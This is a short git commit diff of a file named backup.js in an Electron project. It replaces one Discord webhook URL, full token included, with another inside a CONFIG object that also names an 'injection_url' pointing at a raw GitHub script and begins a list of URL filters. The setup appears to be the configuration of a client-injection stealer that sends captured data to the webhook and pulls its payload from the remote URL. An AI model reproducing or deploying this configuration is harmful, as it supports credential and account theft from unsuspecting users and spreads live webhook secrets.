e79ede820f007a1a1a965963babc70e8f7676f6d
undefinedsource338 <hairo49@yandex.com>
2025-11-02 18:57:04 +0300

    Update backup.js

--- backup.js
+++ backup.js
@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1434568342550876181/VjVvk5y-1zpSdkUqUTGTB57dT4pwMJdO2K3bqqXxCp7T_kTqYAW6tILBwrEPhokgWODm",
+    webhook: "https://discord.com/api/webhooks/1434301585525178378/yIhRjo_knXG6Wh1rE0QnCkwlAvMtCHW7gSaewspnbfg2LwsfVbn1Qo-xeb0VX_wEgTN8",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/backup.js",
     filters: {
         urls: [
